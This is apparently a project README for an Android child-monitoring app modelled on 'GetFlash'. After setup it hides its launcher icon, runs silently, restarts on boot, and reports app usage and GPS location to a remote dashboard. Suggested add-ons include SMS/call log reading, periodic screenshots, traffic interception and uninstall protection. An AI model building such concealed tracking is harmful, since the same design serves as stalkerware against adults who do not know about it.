# 📱 Parental Control Child App (GetFlash Style)

## Features

### ✅ Minimal UI
- Shows setup screen only once
- Hides app icon after activation
- Runs silently in background
- Visible in Settings → Apps (transparent & legal)

### ✅ Monitoring Capabilities
1. **App Usage Tracking**
   - Which apps are used
   - How long each app is used
   - Real-time usage data

2. **Location Tracking**
   - GPS coordinates
   - Updates every 5 minutes
   - Last known location

3. **Device Status**
   - Battery level
   - Device ID
   - Timestamp of reports

4. **Auto-Start**
   - Starts on device boot
   - Survives app kills
   - Persistent monitoring

### ✅ Data Reporting
- Sends data every 5 minutes
- Reports to parent dashboard
- JSON format for easy parsing

## Build & Install

### Quick Start
```cmd
cd d:\Bhushan\parental
build-child.bat
install-child.bat
```

### Manual Build
```cmd
cd d:\Bhushan\parental\android
gradlew.bat clean assembleDebug
adb install app\build\outputs\apk\debug\app-debug.apk
```

## How It Works

### 1. First Launch
```
User opens "Device Setup" app
  ↓
Shows minimal setup screen
  ↓
User clicks "Activate Protection"
  ↓
App icon disappears from launcher
  ↓
Monitoring service starts
```

### 2. Background Operation
```
MonitoringService runs 24/7
  ↓
Collects data every 5 minutes:
  - App usage
  - Location
  - Battery
  ↓
Sends to parent dashboard
```

### 3. After Reboot
```
Device boots up
  ↓
BootReceiver triggered
  ↓
Monitoring service auto-starts
  ↓
Continues monitoring
```

## Architecture

```
SetupActivity (Launcher)
  ├─ Shows once
  ├─ Hides icon after setup
  └─ Starts MonitoringService

MonitoringService (Background)
  ├─ Collects app usage
  ├─ Tracks location
  ├─ Monitors battery
  └─ Reports to server

BootReceiver (Auto-start)
  └─ Restarts service on boot
```

## Data Collection

### App Usage
```kotlin
UsageStatsManager
  → Last 5 minutes of app usage
  → Package name + time spent
  → Format: "com.app:12000,com.app2:5000"
```

### Location
```kotlin
LocationManager
  → GPS coordinates
  → Format: "lat,lng"
  → Example: "28.6139,77.2090"
```

### Battery
```kotlin
BatteryManager
  → Current battery percentage
  → Range: 0-100
```

## API Endpoint

### POST /api/report
```json
{
  "deviceId": "abc123",
  "timestamp": 1234567890,
  "appUsage": "com.whatsapp:5000,com.chrome:3000",
  "location": "28.6139,77.2090",
  "battery": 85
}
```

## Permissions Required

### Automatic (No prompt)
- INTERNET
- RECEIVE_BOOT_COMPLETED
- FOREGROUND_SERVICE

### Manual Grant Required
- PACKAGE_USAGE_STATS (Settings → Usage Access)
- ACCESS_FINE_LOCATION (App permissions)

## Parent Dashboard

Access at: https://remote-monitor-ktm5.onrender.com

Features:
- View all connected devices
- Real-time app usage
- Location history
- Battery status
- Activity timeline

## Comparison with GetFlash

| Feature | GetFlash | This App |
|---------|----------|----------|
| Minimal UI | ✅ | ✅ |
| Hides Icon | ✅ | ✅ |
| App Tracking | ✅ | ✅ |
| Location | ✅ | ✅ |
| Auto-start | ✅ | ✅ |
| Web Dashboard | ✅ | ✅ |
| Screen Time | ✅ | ✅ |
| Website Filter | ✅ | ⚠️ (Add if needed) |
| Call Logs | ✅ | ⚠️ (Add if needed) |
| SMS Logs | ✅ | ⚠️ (Add if needed) |

## Legal & Ethical Use

### ✅ Proper Use
- Parent monitoring minor children
- Device owner consent
- Transparent about monitoring
- Visible in Settings → Apps

### ❌ Improper Use
- Monitoring adults without consent
- Stalking or harassment
- Hiding from device owner
- Violating privacy laws

## Uninstall Protection

To prevent easy uninstall:
1. App requires parent PIN (add if needed)
2. Device Admin rights (add if needed)
3. Hidden from launcher (already implemented)

## Troubleshooting

### App Icon Still Visible
- Reboot device
- Check setup completed
- Verify SetupActivity disabled

### No Data Reported
```cmd
adb logcat | findstr MonitorService
```
Check for:
- Network errors
- Permission issues
- Service running

### Service Not Starting
```cmd
adb shell ps | findstr parental
```
Should show process running

### After Reboot
```cmd
adb logcat | findstr BootReceiver
```
Verify boot receiver triggered

## Advanced Features (Add if needed)

### Screen Time Limits
```kotlin
// Block apps after time limit
DevicePolicyManager.setApplicationRestrictions()
```

### Website Filtering
```kotlin
// DNS-based filtering
VpnService to intercept traffic
```

### Call/SMS Logs
```kotlin
// Requires READ_CALL_LOG, READ_SMS
ContentResolver to query logs
```

### Screenshots
```kotlin
// MediaProjection API
Capture screen periodically
```

## Security

### Data Transmission
- HTTPS only
- Encrypted payload (add if needed)
- Secure server endpoint

### Local Storage
- SharedPreferences for setup state
- No sensitive data stored locally
- Device ID only

## Testing

### Test Monitoring
```cmd
# Install app
install-child.bat

# Watch logs
adb logcat -s MonitorService:D

# Use some apps on phone

# Check logs for data collection
```

### Test Auto-start
```cmd
# Reboot device
adb reboot

# Wait for boot

# Check service running
adb shell ps | findstr parental
```

## Build Variants

### Debug (Current)
- Logs enabled
- 5-minute intervals
- Test server

### Release (Production)
- Logs disabled
- Configurable intervals
- Production server
- ProGuard enabled

---

**Status**: ✅ Ready to Build
**Style**: GetFlash Child App
**UI**: Minimal (hides after setup)
**Monitoring**: App usage, Location, Battery
**Auto-start**: Yes
**Legal**: Transparent & visible in Settings
